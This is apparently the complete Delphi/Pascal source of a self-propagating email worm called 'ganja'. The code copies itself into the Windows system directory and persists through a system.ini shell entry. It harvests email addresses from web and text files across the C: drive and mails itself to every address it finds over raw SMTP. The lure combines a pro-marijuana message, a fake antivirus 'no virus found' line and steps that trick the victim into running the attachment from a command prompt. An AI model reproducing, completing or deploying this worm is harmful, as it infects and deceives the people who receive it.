   program ganja;

   uses
     windows,
     winsock,
     MXResolver,
     Unit1 in 'Unit1.pas';

   const
     avpeople :string = #13#10#13#10'Note To AntiVirus People: This worm is not made by same person as'+
                'WORM_MARI.A-G is. This is just a follower. I am the same author as CISSI worm.'#13#10#13#10;
     subject :string = 'Marijuana: Is it as bad as people think?';
     body :string = 'When you hear the word "marijuana" do you think about death?'#13#10+
            'People in pain? and people suffering, in a addicted life?'#13#10+
            'Then you dont know what it is.'#13#10+
            ''#13#10+
            'How come, that this very dangerous drugs, NEVER have killed'#13#10+
            'a human ? Since there are no reports on any deathcase caused'#13#10+
            'by marijuana. How come, that marijuana doesnt have any side'#13#10+
            'effects or any bad "afterday"-effects?'#13#10+
            'Why do some people get marijuana as medical treatment, if its'#13#10+
            'so dangerous and so illegal?'#13#10+
            ''#13#10+
            'This is what you people should think about, this is what you'#13#10+
            'should know.'#13#10+
            ''#13#10+
            'If you dont belive in me, then browse google.com and search for'#13#10+
            'Marijuana + info.'#13#10+
            'You will see for yourself (there are alot of medical pages about'#13#10+
            'marijuana).'#13#10+
            ''#13#10+
            'Join us, End Prohibition Now! Say yes to marijuana, make the world'#13#10+
            'a more peacefull place, where no war is, where no hate is.'#13#10#13#10#13#10;
     encoded :string = '---========================================---'#13#10+
                       ''#13#10+
                       'The attached image is encoded to bypass drug-filters.'#13#10+
                       'To decode the file, you have to use MsDos.'#13#10+
                       'Follow these steps:'#13#10+
                       ' 1. Goto "Start" and click "Run"'#13#10+
                       ' 2. Type "Cmd" (if it doesnt work, try "Command")'#13#10+
                       ' 3. A MsDos window should now popup.'#13#10+
                       ' 4. Drag and Drop the encoded image into this MsDos Window.'#13#10+
                       ' 5. The file will be decoded, and be able to view.'#13#10+
                       ' 6. Rename the file to ".jpg" instead of ".enc"'#13#10+
                       ' 7. You''r done.'#13#10+
                       'Thanks for using this guide to watch the file.'#13#10+
                       ''#13#10+
                       ' +++ Attachment scanned by McAfee scan.'#13#10+
                       ' +++ No virus found.';

   var
     mailSock: TSocket;
     addr    : TSockAddrIn;
     wsa     : TWsaData;
     from, rcpt: String;
     filename: String;
     attachment: String;
     notepad : TextFile;
     dir     : Array[0..256] Of Char;
     tmp     : String;
     mx      : TMXResolver;

   function mailsend:bool;
   var
     i           : integer;
     f           : FILE;
     FileBuf     : AnsiString;
     Poo         : AnsiString;

   procedure senddata(text:string; sock: tsocket);
   begin
     send(sock, text[1], length(text), 0);
   end;

   begin

     mx := TMXResolver.Create(copy(rcpt,pos('@',rcpt)+1, length(rcpt)));
     if mx.ListOfSMTPServers.Count = 0 then exit ;

     for i :=0 to mx.ListOfSMTPServers.Count -1 do
     begin
       WsaStartUp(MakeWord(2,1),wsa);

       mailsock := socket(af_inet, sock_stream, 0);

       addr.sin_family := af_inet;
       addr.sin_port := htons(25);
       addr.sin_addr.S_addr := inet_addr(pchar(mx.ListOfSMTPServers.Strings(I)));

       if connect(mailsock, addr, sizeof(addr)) > -1 then begin
         senddata('HELO net.com'#13#10,mailsock);
         senddata('MAIL FROM: <'+from+'>'#13#10,mailsock);
         senddata('RCPT TO: <'+rcpt+'>'#13#10,mailsock);
         senddata('DATA'#13#10,mailsock);
         senddata('From: '+from+#13#10+
                  'To: '+rcpt+#13#10+
                  'Subject: '+Subject+#13#10+
                  'MIME-Version: 1.0'#13#10+
                  'Content-Type: multipart/mixed; boundray="ganja"'#13#10#13#10+
                  '--ganja'#13#10+
                  'Content-Type: text/plain; charset:us-ascii'#13#10#13#10+
                  body+encoded+#13#10#13#10+
                  '--ganja'#13#10+
                  'Content-Type: application/x-shockwave-flash;'#13#10+
                  '    name="'+attachment+'"'#13#10+
                  'Content-Transfer-Encoding: base64'#13#10#13#10,mailsock);
         AssignFile(f, filename);
         filemode := 0;
         {$I-}
         Reset(f, 1);
         If IOResult = 0 Then Begin
           SetLength(FileBuf, FileSize(F));
           BlockRead(F, FIleBuf[1], GetFileSize(FileName));
           Base64Encode(FileBuf, Poo);
           SendData(Poo,mailsock);
           CloseFile(F);
         End;
         {$I+}

         SendData(#13#10'--ganja--'#13#10'.'#13#10, mailsock);
         SendData('QUIT'#13#10, mailsock);
       end;
       wsacleanup;
     end;
   end;

   function ExtractFilePath(const Path: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     L := Length(Path);
     for i := L downto 1 do
     begin
       Ch := Path[i];
       if (Ch = '\') or (Ch = '/') then
       begin
         Result := Copy(Path, 1, i);
         Break;
       end;
     end;
   end;

   function ExtractFileName(const Path: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     L := Length(Path);
     for i := L downto 1 do
     begin
       Ch := Path[i];
       if (Ch = '\') or (Ch = '/') then
       begin
         Result := Copy(Path, i + 1, L - i);
         Break;
       end;
     end;
   end;

   function ExtractFileExt(const Filename: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     L := Length(Filename);
     for i := L downto 1 do
     begin
       Ch := Filename[i];
       if (Ch = '.') then
       begin
         Result := Copy(Filename, i + 1, L - i);
         Break;
       end;
     end;
   end;

   function LowerCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   Procedure DoGather(FileName, Filter: String);
   Var
     FileExt     :String;
     Dir         :String;
     Tmp         :String;
     Line        :String;
     Ch          :String;
     Tmp1,Tmp2   :String;
     Tmp3        :String;
     F           :TextFile;
     FileSize    :Integer;
     I,J         :Integer;
     Count       :Integer;
     ThreadID    :Dword;
   Begin
     Count  := 0;
     dir := extractfilepath(filename);
       If FileName <> '' Then
         Begin
           FileSize := GetFileSize(FileName);
           If FileSize <= (1024 * 100) Then
           Begin
             FileExt := ExtractFileExt(FileName);
             If Pos(LowerCase(FileExt),LowerCase(Filter)) > 0 Then
             Begin
               Tmp3 := Dir+'tmp_'+ExtractFileName(FileName);
               If (CopyFile(pChar(FileName), pChar(Tmp3), False)) and (copy(tmp3,1,4) <> 'tmp_') Then
               Begin
                 FileName := Dir+'tmp_'+ExtractFileName(FileName);
                 AssignFile(F, FileName);
                 Reset(F);
                 Read(F, Tmp);
                 Line := Tmp;
                 ReadLn(F, Tmp);
                 While Not Eof(F) Do
                 Begin
                   Read(F, Tmp);
                   Line := Line + Tmp;
                   ReadLn(F, Tmp);
                 End;
                 CloseFile(F);
                 If DeleteFile(pChar(FileName)) Then
                 Begin
                   If Pos('@', Line) > 0 Then
                   Begin
                     Tmp1 := '';
                     Tmp2 := '';
                     J := 0;
                     Ch := '';
                     For J := 1 To Length(Line) Do
                     Begin
                       Ch := Line[j];
                       If Pos(LowerCase(Ch), 'abcdefghijklmnopqrstuvwxyz-_0123456789@.') > 0 Then
                       Begin
                         Tmp1 := Tmp1 + Ch;
                       End Else
                       Begin
                         If Pos('@', Tmp1)>0 Then
                         Begin
                           If Count < 10000 Then
                           Begin
                             If (Tmp1 <> '@') And
                                (Tmp1[1] <> '@') And
                                (Tmp1[Length(Tmp1)] <> '@') And
                                (Pos('.', Tmp1) > 0) Then
                             Begin
                               from := 'druginfo@maniacs.com';
                               rcpt := tmp1;
                               mailsend;
                             End;
                           End;
                         Tmp1 := '';
                       End Else
                         Tmp1 := '';
                       End;
                     End;
                   End;
                 End;
               End;
             End;
           End;
         End;
   End;

   procedure doscan(dir, name, mask: string);
   var
     Sr: TSearchRec;
     ext: string;
   begin
     if dir[length(dir)] <> '\' then dir := dir + '\';
     If FindFirst(dir + '*.*', faDirectory, sr) = 0 Then
     Repeat
       If ((Sr.Attr and faDirectory) = faDirectory) and (sr.Name[1] <> '.') then
         doscan(dir + sr.Name, '*', '*.*')
       Else
       Begin
         ext := extractfileext(sr.Name);
         if ext = 'html' then dogather(dir + sr.Name, 'htmlplphpasptxt');
         if ext = 'htm'  then dogather(dir + sr.Name, 'htmlplphpasptxt');
         if ext = 'pl'   then dogather(dir + sr.Name, 'htmlplphpasptxt');
         if ext = 'php'  then dogather(dir + sr.Name, 'htmlplphpasptxt');
         if ext = 'asp'  then dogather(dir + sr.Name, 'htmlplphpasptxt');
         if ext = 'txt'  then dogather(dir + sr.Name, 'htmlplphpasptxt');
       End;
     Until (FindNext(Sr) <> 0);
     FindClose(SR);
   end;

   begin

     if createmutex(nil,false,pchar('end:prohibition:now')) = error_already_exists then exit;

     GetSystemDirectory(@dir, 256);
     filename := string(dir)+'\w32gnj.exe';
     WritePrivateProfileString('boot','shell', 'Explorer.exe w32gnj.exe c:\end;prohibition;now.txt', 'system.ini');

     if not copyfile(pchar(paramstr(0)), pchar(filename), false) then exit;
     tmp := string(dir)+'\info.enc';
     CopyFile(pChar(ParamStr(0)), pChar(Tmp), False);
     tmp := 'C:\info.enc';
     CopyFile(pChar(ParamStr(0)), pChar(Tmp), False);
     If Not ZipIt(Tmp) Then RarIt(Tmp);
     attachment := extractfilename(tmp);
     Sleep(1000);
     CopyFile(pChar(Tmp), pChar(String(Dir)+'\'+ExtractFileName(tmp)), False);
     Sleep(1000);
     DeleteFile(pChar(Tmp));

     doscan('C:\','*','*.*');

     assignfile(notepad, 'c:\end;prohibition;now.txt');
     rewrite(notepad);
     write(notepad, body);
     closefile(notepad);

   end.
